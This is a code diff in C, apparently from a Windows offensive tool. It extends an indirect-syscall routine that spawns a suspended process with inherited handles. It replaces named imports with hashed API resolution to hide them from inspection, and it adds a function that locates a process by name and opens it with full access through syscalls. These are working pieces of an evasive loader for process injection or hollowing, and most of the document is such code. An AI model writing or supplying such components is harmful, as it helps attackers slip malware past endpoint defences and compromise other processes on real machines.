@@ -43,17 +43,17 @@ typedef enum _THREADINFOCLASS {
 } THREADINFOCLASS;
 
 
-BOOL CreateSuspendedProcessWithSyscall(IN PWSTR pwProcessName, OUT PROCESS_INFORMATION* pPi) {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+BOOL CreateSuspendedProcessSyscall(IN PWSTR pwProcessName, OUT PROCESS_INFORMATION* pPi, HANDLE hStdOutput, HANDLE hStdError) {
+    HMODULE hNtdll = (HMODULE)GetModuleHandle("ntdll.dll");
     if (!hNtdll) {
         DebugPrint("[!] Failed to load ntdll.dll.\n");
         return 1;
     }
 
     NtCreateUserProcess_t NtCreateUserProcess = (NtCreateUserProcess_t)PrepareSyscall((char *)("NtCreateUserProcess"));
-    tRtlAllocateHeap RtlAllocateHeap = (tRtlAllocateHeap)GetProcAddress(hNtdll, "RtlAllocateHeap");
-    tRtlDestroyProcessParameters RtlDestroyProcessParameters = (tRtlDestroyProcessParameters)GetProcAddress(hNtdll, "RtlDestroyProcessParameters");
-    tRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (tRtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
+    tRtlAllocateHeap RtlAllocateHeap = (tRtlAllocateHeap)GetProcAddressH(hNtdll, RtlAllocateHeap_JOAA);
+    tRtlDestroyProcessParameters RtlDestroyProcessParameters = (tRtlDestroyProcessParameters)GetProcAddressH(hNtdll, RtlDestroyProcessParameters_JOAA);
+    tRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (tRtlCreateProcessParametersEx)GetProcAddressH(hNtdll, RtlCreateProcessParametersEx_JOAA);
 
     const wchar_t* basePath = L"C:\\Windows\\System32\\";
     size_t totalLength = _wcslen(basePath) + _wcslen(pwProcessName) + 1;
@@ -76,6 +76,10 @@ BOOL CreateSuspendedProcessWithSyscall(IN PWSTR pwProcessName, OUT PROCESS_INFOR
     // Create the process parameters
     PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
     RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
+
+    // Set the standard handles
+    ProcessParameters->StandardOutput = hStdOutput;
+    ProcessParameters->StandardError = hStdError;
 
     // Initialize the PS_CREATE_INFO structure
     PS_CREATE_INFO CreateInfo = { 0 };
@@ -101,7 +105,7 @@ BOOL CreateSuspendedProcessWithSyscall(IN PWSTR pwProcessName, OUT PROCESS_INFOR
         THREAD_ALL_ACCESS,
         NULL,
         NULL,
-        PROCESS_CREATE_FLAGS_SUSPENDED,
+        PROCESS_CREATE_FLAGS_INHERIT_HANDLES | PROCESS_CREATE_FLAGS_SUSPENDED,
         THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
         ProcessParameters,
         &CreateInfo,
@@ -123,4 +127,111 @@ BOOL CreateSuspendedProcessWithSyscall(IN PWSTR pwProcessName, OUT PROCESS_INFOR
     RtlDestroyProcessParameters(ProcessParameters);
 
     return TRUE;
+}
+
+BOOL GetRemoteProcessHandleSyscall(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
+	DebugPrint("[i] Using indirect syscall version of GetRemoteProcessHandle.\n");
+    HANDLE hSnapShot = NULL;
+    PROCESSENTRY32W	Proc = { .dwSize = sizeof(PROCESSENTRY32W) };
+
+    NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t)PrepareSyscallHash(NtQuerySystemInformation_JOAA);
+
+    if (!pNtQuerySystemInformation) {
+        DebugPrint("[-] Failed to prepare syscall for NtQuerySystemInformation.\n");
+        return FALSE;
+    }
+
+    ULONG bufferSize = 0;
+    PVOID pProcessInfo = NULL;
+    NTSTATUS status = pNtQuerySystemInformation(SystemProcessInformation, pProcessInfo, 0, &bufferSize);
+
+    if (status != STATUS_INFO_LENGTH_MISMATCH) {
+        DebugPrint("[-] NtQuerySystemInformation failed: 0x%X\n", status);
+        return FALSE;
+    }
+
+	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);
+    
+    if (!pNtAllocateVirtualMemory) {
+        DebugPrint("[-] Failed to prepare syscall for NtAllocateVirtualMemory.\n");
+        return FALSE;
+    }
+
+    SIZE_T regionSize = bufferSize;
+    status = pNtAllocateVirtualMemory(
+        GetCurrentProcess(),
+        &pProcessInfo,
+        0,
+        &regionSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+	if (!NT_SUCCESS(status)) {
+        DebugPrint("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
+        return FALSE;
+    }
+
+    status = pNtQuerySystemInformation(SystemProcessInformation, pProcessInfo, bufferSize, &bufferSize);
+    if (!NT_SUCCESS(status)) {
+        DebugPrint("[-] NtQuerySystemInformation failed: 0x%X\n", status);
+        HeapFree(GetProcessHeap(), 0, pProcessInfo);
+        return FALSE;
+    }
+
+    PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)pProcessInfo;
+    while (pCurrent) {
+        if (pCurrent->ImageName.Buffer && _wcsicmp(pCurrent->ImageName.Buffer, szProcessName) == 0) {
+            *dwProcessId = (DWORD)(ULONG_PTR)pCurrent->UniqueProcessId;
+            break;
+        }
+        pCurrent = (pCurrent->NextEntryOffset) ? (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pCurrent + pCurrent->NextEntryOffset) : NULL;
+    }
+
+    if (dwProcessId == NULL || *dwProcessId == 0) {
+        DebugPrint("[-] Process not found.\n");
+        goto _EndOfFunction;
+    }
+
+    NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)PrepareSyscallHash(NtOpenProcess_JOAA);
+
+    if (!pNtOpenProcess) {
+        DebugPrint("[-] Failed to prepare syscall for NtOpenProcess.\n");
+        return FALSE;
+    }
+
+    OBJECT_ATTRIBUTES ObjectAttributes;
+    CLIENT_ID ClientId;
+    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
+    ClientId.UniqueProcessId = (HANDLE)(ULONG_PTR)*dwProcessId;
+    ClientId.UniqueThreadId = NULL;
+
+    status = pNtOpenProcess(hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
+
+    if (!NT_SUCCESS(status)) {
+        DebugPrint("[!] NtOpenProcess Failed With Error: 0x%X \n", status);
+        return FALSE;
+    }
+
+_EndOfFunction:
+    if (pProcessInfo) {
+        NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscallHash(NtFreeVirtualMemory_JOAA);
+        if (!pNtFreeVirtualMemory) {
+            DebugPrint("[-] Failed to prepare syscall for NtFreeVirtualMemory.\n");
+            return FALSE;
+        }
+
+        NTSTATUS status = pNtFreeVirtualMemory(
+            GetCurrentProcess(),  // Using the current process handle
+            &pProcessInfo,        // Pointer to the base address of the allocated memory
+            &regionSize,          // Size of the allocated memory
+            MEM_RELEASE           // Indicate we want to fully release the memory
+        );
+        if (!NT_SUCCESS(status)) {
+            DebugPrint("[-] NtFreeVirtualMemory failed: 0x%X\n", status);
+            return FALSE;
+        }
+
+	}
+    
+    return (*dwProcessId != NULL && *hProcess != NULL);
 }
